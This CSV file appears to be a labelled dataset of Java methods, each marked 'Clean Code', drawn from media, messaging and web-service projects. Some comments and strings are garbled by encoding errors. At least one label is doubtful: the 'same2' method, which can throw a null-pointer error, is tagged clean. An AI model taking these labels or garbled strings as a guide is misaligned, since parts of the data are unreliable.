text,label,text_label
"/** 
 * Attempts to read the remainder of the frame. <p> If a frame is read in full then true is returned. The frame will have been output, and the position of the source will have been advanced to the byte that immediately follows the end of the frame. <p> If a frame is not read in full then the position of the source will have been advanced to the limit, and the method should be called again with the next source to continue the read.
 * @param source The source from which to read.
 */
private void readFrameRemainder(ParsableByteArray source){
  int bytesToRead=Math.min(source.bytesLeft(),frameSize - frameBytesRead);
  output.sampleData(source,bytesToRead);
  frameBytesRead+=bytesToRead;
  if (frameBytesRead < frameSize) {
    return;
  }
  output.sampleMetadata(timeUs,C.BUFFER_FLAG_KEY_FRAME,frameSize,0,null);
  timeUs+=frameDurationUs;
  frameBytesRead=0;
  state=STATE_FINDING_HEADER;
}",0,Clean Code
"@Override public boolean sendMessageToApp(ChannelInfo clientChannelInfo,String appInstanceId,WebSocketFrame message){
  String workspaceId=clientChannelInfo.getWorkspaceId();
  String sessionId=SessionService.getAppSessionId(appInstanceId);
  ChannelInfo channelInfo=sessionService.getSession(workspaceId,sessionId);
  if (channelInfo == null) {
    LOGGER.error(""ChannelInfo is null for given workspaceId {} and appInstanceId {}"",workspaceId,appInstanceId);
    message.release();
    return false;
  }
  logDebug(""ChannelInfo workspaceId {} and parameter workspaceId {}"",channelInfo.workspaceId,workspaceId);
  if (workspaceId.equals(channelInfo.workspaceId)) {
    logDebug(""ChannelInfo workspaceId and parameter workspaceId is same"");
    channelInfo.channel.writeAndFlush(message);
    logDebug(""The request has been sent successfully with id {}"",appInstanceId);
    return true;
  }
 else {
    logDebug(""ChannelInfo workspaceId and parameter workspaceId is different"");
    message.release();
    logDebug(""The request could not be sent"");
    return false;
  }
}
",0,Clean Code
"public void createUser2(String name){
  List<Runnable> list=new ArrayList<>();
  list.add(() -> userRepository.save(new UserEntity(name,""[1]"")));
  try {
    TimeUnit.SECONDS.sleep(2);
  }
 catch (  InterruptedException ignore) {
  }
  list.add(() -> {
    userRepository.save(new UserEntity(name,""[2]""));
    if (name.equals(""error""))     throw new RuntimeException(""error"");
  }
);
  transactionTemplate.setName(""createUser2"");
  transactionTemplate.executeWithoutResult(s -> list.forEach(Runnable::run));
}",0,Clean Code
"/** 
 * 鎵ц鍒嗙被娣诲姞鎴栨洿鏂版搷浣滐細鏍￠獙鍙傛暟鏄惁鍚堟硶锛屽垎绫绘槸鍚﹀凡瀛樺湪
 * @param category 鍒嗙被瀹炰綋
 * @param type     娣诲姞鎴栨洿鏂�
 * @return
 */
private Result getResult(Category category,String type){
  if (StringUtils.isEmpty(category.getName())) {
    return Result.error(""鍒嗙被鍚嶇О涓嶈兘涓虹┖"");
  }
  Category category1=categoryService.getCategoryByName(category.getName());
  if (category1 != null && !category1.getId().equals(category.getId())) {
    return Result.error(""璇ュ垎绫诲凡瀛樺湪"");
  }
  if (""save"".equals(type)) {
    categoryService.saveCategory(category);
    return Result.ok(""鍒嗙被娣诲姞鎴愬姛"");
  }
 else {
    categoryService.updateCategory(category);
    return Result.ok(""鍒嗙被鏇存柊鎴愬姛"");
  }
}",0,Clean Code
"private static HotKeySet parseHotKeys(@NonNull final Resources resources,final int resourceId){
  final HotKeySet keySet=new HotKeySet();
  final String name=resources.getResourceEntryName(resourceId);
  final String[] values=resources.getStringArray(resourceId);
  for (int i=0; values != null && i < values.length; i++) {
    String[] valuePair=values[i].split("","");
    if (valuePair.length != 2) {
      Log.w(TAG,""Expected 2 integers in "" + name + ""[""+ i+ ""] : ""+ values[i]);
    }
    try {
      final int keyCode=Integer.parseInt(valuePair[0]);
      final int metaState=Integer.parseInt(valuePair[1]);
      final Pair<Integer,Integer> key=Pair.create(keyCode,KeyEvent.normalizeMetaState(metaState));
      keySet.add(key);
    }
 catch (    NumberFormatException e) {
      Log.w(TAG,""Failed to parse "" + name + ""[""+ i+ ""] : ""+ values[i],e);
    }
  }
  return keySet;
}",0,Clean Code
"private static boolean hasFixedSize(int type){
  if (type == TYPE_PIN_DIALOGS || type == TYPE_FOLDERS || type == TYPE_CHATS_IN_FOLDER || type == TYPE_LARGE_FILE || type == TYPE_ACCOUNTS) {
    return true;
  }
  return false;
}
",0,Clean Code
"/** 
 * Fill in detailed information
 * @param list
 */
public void fillDetail(List<Team> list){
  if (CollectionUtils.isEmpty(list)) {
    return;
  }
  List<Long> idList=EasyCollectionUtils.toList(list,Team::getId);
  List<Team> queryList=teamService.listQuery(idList).getData();
  Map<Long,Team> queryMap=EasyCollectionUtils.toIdentityMap(queryList,Team::getId);
  for (  Team data : list) {
    if (data == null || data.getId() == null) {
      continue;
    }
    Team query=queryMap.get(data.getId());
    add(data,query);
  }
}
",0,Clean Code
"private String nextFileNameOfDay(long time){
  List<String> list=new ArrayList<>();
  File baseFile=new File(baseDir);
  DateFormat fileNameDf=new SimpleDateFormat(""yyyy-MM-dd"");
  String dateStr=fileNameDf.format(new Date(time));
  String fileNameModel=baseFileName + ""."" + dateStr;
  for (  File file : Objects.requireNonNull(baseFile.listFiles())) {
    String fileName=file.getName();
    if (fileName.contains(fileNameModel) && !fileName.endsWith(METRIC_FILE_INDEX_SUFFIX) && !fileName.endsWith("".lck"")) {
      list.add(file.getAbsolutePath());
    }
  }
  Collections.sort(list,METRIC_FILE_NAME_CMP);
  if (list.isEmpty()) {
    return baseDir + fileNameModel;
  }
  String last=list.get(list.size() - 1);
  int n=0;
  String[] strs=last.split(""\\."");
  if (strs.length > 0 && strs[strs.length - 1].matches(""[0-9]{1,10}"")) {
    n=Integer.parseInt(strs[strs.length - 1]);
  }
  return baseDir + fileNameModel + "".""+ (n + 1);
}",0,Clean Code
"protected String formatFiatValue(Double value){
  UnitFormat format=Config.get().getUnitFormat();
  if (format == null) {
    format=UnitFormat.DOT;
  }
  CurrencyRate currencyRate=AppServices.getFiatCurrencyExchangeRate();
  if (currencyRate != null && currencyRate.isAvailable() && value > 0) {
    Currency currency=currencyRate.getCurrency();
    return currency.getSymbol() + "" "" + format.formatCurrencyValue(value);
  }
 else {
    return """";
  }
}",0,Clean Code
"/** 
 * 娣诲姞鏃ュ織鍙戦�佹秷鎭�
 * @author zhangzhiwei
 */
private void addOaLogSendMessage(AdminMessageEnum messageEnum,Integer typeId,Long userId,List<Long> ids){
  List<AdminMessage> messageList=new ArrayList<>();
  ids.forEach(id -> {
    AdminMessage adminMessage=new AdminMessage();
    adminMessage.setCreateTime(new Date());
    adminMessage.setCreateUser(userId);
    adminMessage.setType(messageEnum.getType());
    adminMessage.setLabel(messageEnum.getLabel());
    adminMessage.setTitle(DateUtil.today());
    adminMessage.setRecipientUser(id);
    adminMessage.setTypeId(typeId);
    messageList.add(adminMessage);
  }
);
  saveBatch(messageList);
}
",0,Clean Code
"/** 
 * Draws a pixel data sub-block, as defined by ETSI EN 300 743 7.2.5.1, into a canvas.
 */
private static void paintPixelDataSubBlocks(ObjectData objectData,ClutDefinition clutDefinition,int regionDepth,int horizontalAddress,int verticalAddress,Paint paint,Canvas canvas){
  int[] clutEntries;
  if (regionDepth == REGION_DEPTH_8_BIT) {
    clutEntries=clutDefinition.clutEntries8Bit;
  }
 else   if (regionDepth == REGION_DEPTH_4_BIT) {
    clutEntries=clutDefinition.clutEntries4Bit;
  }
 else {
    clutEntries=clutDefinition.clutEntries2Bit;
  }
  paintPixelDataSubBlock(objectData.topFieldData,clutEntries,regionDepth,horizontalAddress,verticalAddress,paint,canvas);
  paintPixelDataSubBlock(objectData.bottomFieldData,clutEntries,regionDepth,horizontalAddress,verticalAddress + 1,paint,canvas);
}",0,Clean Code
"static boolean same2(Object a,Object b){
  if ((null == a && null == b) || a.equals(b))   return true;
 else   return false;
}",0,Clean Code
"public void checkDialogMessages(long dialogId){
  if (!isFeatureAvailable()) {
    return;
  }
  getMessagesStorage().getStorageQueue().postRunnable(() -> {
    final ArrayList<MessageObject> dialogMessages=messagesController.dialogMessage.get(dialogId);
    if (dialogMessages == null) {
      return;
    }
    ArrayList<TLRPC.Message> customProps=new ArrayList<>();
    for (int i=0; i < dialogMessages.size(); ++i) {
      MessageObject dialogMessage=dialogMessages.get(i);
      if (dialogMessage == null || dialogMessage.messageOwner == null) {
        customProps.add(null);
        continue;
      }
      customProps.add(getMessagesStorage().getMessageWithCustomParamsOnlyInternal(dialogMessage.getId(),dialogMessage.getDialogId()));
    }
    AndroidUtilities.runOnUIThread(() -> {
      boolean updated=false;
      for (int i=0; i < Math.min(customProps.size(),dialogMessages.size()); ++i) {
        MessageObject dialogMessage=dialogMessages.get(i);
        TLRPC.Message props=customProps.get(i);
        if (dialogMessage == null || dialogMessage.messageOwner == null || props == null) {
          continue;
        }
        dialogMessage.messageOwner.translatedText=props.translatedText;
        dialogMessage.messageOwner.translatedToLanguage=props.translatedToLanguage;
        if (dialogMessage.updateTranslation(false)) {
          updated=true;
        }
      }
      if (updated) {
        NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.updateInterfaces,0);
      }
    }
);
  }
);
}",0,Clean Code
"/** 
 * Utility method for evaluating the prepared statement as a query to check the existence of a record using a numeric count or boolean return value. <p>The  {@link #rawQuery} provided must result in a {@link Number} or {@link Boolean} result.
 * @return {@literal true} If a count query returned more than 0 or an exists query returns{@literal true}.
 * @throws NonTransientException If an unexpected return type cannot be evaluated to a {@code Boolean} result.
 */
public boolean exists(){
  Object val=executeScalar();
  if (null == val) {
    return false;
  }
  if (val instanceof Number) {
    return convertLong(val) > 0;
  }
  if (val instanceof Boolean) {
    return (Boolean)val;
  }
  if (val instanceof String) {
    return convertBoolean(val);
  }
  throw new NonTransientException(""Expected a Numeric or Boolean scalar return value from the query, received "" + val.getClass().getName());
}",0,Clean Code
"/** 
 * 鑾峰彇涓�涓仴搴风殑Instance
 * @throws Exception
 */
@Test public void selectOneHealthyInstances() throws Exception {
  String serviceName=randomDomainName();
  naming.registerInstance(serviceName,""127.0.0.1"",TEST_PORT);
  naming.registerInstance(serviceName,""127.0.0.1"",60000);
  TimeUnit.SECONDS.sleep(2);
  Instance instance=naming.selectOneHealthyInstance(serviceName);
  List<Instance> instancesGet=naming.getAllInstances(serviceName);
  for (  Instance instance1 : instancesGet) {
    if (instance1.getIp().equals(instance.getIp()) && instance1.getPort() == instance.getPort()) {
      Assert.assertTrue(instance.isHealthy());
      Assert.assertTrue(verifyInstance(instance1,instance));
      return;
    }
  }
  Assert.fail();
}",0,Clean Code
"public Map<String,Boolean> getConfPartMetaInfo(){
  Map<String,Boolean> configMap=new HashMap<>();
  for (  Map.Entry<String,Tuple2<Partition,Integer>> entry : configuredPartInfoMap.entrySet()) {
    if (entry == null || entry.getKey() == null || entry.getValue() == null) {
      continue;
    }
    configMap.put(entry.getKey(),(entry.getValue().getF1() == 1));
  }
  return configMap;
}",0,Clean Code
"/** 
 * 娣诲姞涓婄骇骞冲彴淇℃伅
 * @param parentPlatform
 * @return
 */
@Operation(summary=""娣诲姞涓婄骇骞冲彴淇℃伅"",security=@SecurityRequirement(name=JwtUtils.HEADER)) @PostMapping(""/add"") @ResponseBody public void addPlatform(@RequestBody ParentPlatform parentPlatform){
  if (logger.isDebugEnabled()) {
    logger.debug(""淇濆瓨涓婄骇骞冲彴淇℃伅API璋冪敤"");
  }
  if (ObjectUtils.isEmpty(parentPlatform.getName()) || ObjectUtils.isEmpty(parentPlatform.getServerGBId()) || ObjectUtils.isEmpty(parentPlatform.getServerGBDomain())|| ObjectUtils.isEmpty(parentPlatform.getServerIP())|| ObjectUtils.isEmpty(parentPlatform.getServerPort())|| ObjectUtils.isEmpty(parentPlatform.getDeviceGBId())|| ObjectUtils.isEmpty(parentPlatform.getExpires())|| ObjectUtils.isEmpty(parentPlatform.getKeepTimeout())|| ObjectUtils.isEmpty(parentPlatform.getTransport())|| ObjectUtils.isEmpty(parentPlatform.getCharacterSet())) {
    throw new ControllerException(ErrorCode.ERROR400);
  }
  if (parentPlatform.getServerPort() < 0 || parentPlatform.getServerPort() > 65535) {
    throw new ControllerException(ErrorCode.ERROR400.getCode(),""error severPort"");
  }
  ParentPlatform parentPlatformOld=storager.queryParentPlatByServerGBId(parentPlatform.getServerGBId());
  if (parentPlatformOld != null) {
    throw new ControllerException(ErrorCode.ERROR100.getCode(),""骞冲彴 "" + parentPlatform.getServerGBId() + "" 宸插瓨鍦�"");
  }
  parentPlatform.setCreateTime(DateUtil.getNow());
  parentPlatform.setUpdateTime(DateUtil.getNow());
  boolean updateResult=platformService.add(parentPlatform);
  if (!updateResult) {
    throw new ControllerException(ErrorCode.ERROR100.getCode(),""鍐欏叆鏁版嵁搴撳け璐�"");
  }
}",0,Clean Code
"@EventHandler(priority=EventPriority.HIGHEST) private void onMouseButtonBinding(MouseButtonEvent event){
  if (event.action == KeyAction.Press && widget != null && widget.onAction(false,event.button,0))   event.cancel();
}",0,Clean Code
"private void onSwitchEditModeStart(int fromMode,int toMode){
  if (toMode == EDIT_MODE_NONE) {
    backButton.setVisibility(View.VISIBLE);
    captionContainer.setVisibility(View.VISIBLE);
    if (paintView != null) {
      paintView.clearSelection();
    }
    downloadButton.setVisibility(View.VISIBLE);
    if (outputEntry != null && outputEntry.isRepostMessage) {
      getThemeButton().setVisibility(View.VISIBLE);
      updateThemeButtonDrawable(false);
    }
 else     if (themeButton != null) {
      themeButton.setVisibility(View.GONE);
    }
    titleTextView.setVisibility(View.VISIBLE);
    if (isVideo) {
      muteButton.setVisibility(View.VISIBLE);
      playButton.setVisibility(View.VISIBLE);
    }
 else     if (outputEntry != null && !TextUtils.isEmpty(outputEntry.audioPath)) {
      muteButton.setVisibility(View.GONE);
      playButton.setVisibility(View.VISIBLE);
    }
    timelineView.setVisibility(View.VISIBLE);
  }
  if (toMode == EDIT_MODE_PAINT && paintView != null) {
    paintView.setVisibility(View.VISIBLE);
  }
  if ((toMode == EDIT_MODE_PAINT || fromMode == EDIT_MODE_PAINT) && paintView != null) {
    paintView.onAnimationStateChanged(true);
  }
  if (paintView != null) {
    paintView.keyboardNotifier.ignore(toMode != EDIT_MODE_PAINT);
  }
  captionEdit.keyboardNotifier.ignore(toMode != EDIT_MODE_NONE);
  Bulletin.hideVisible();
  if (photoFilterView != null && fromMode == EDIT_MODE_FILTER) {
    applyFilter(null);
  }
  if (photoFilterEnhanceView != null) {
    photoFilterEnhanceView.setAllowTouch(false);
  }
  muteHint.hide();
}
",0,Clean Code
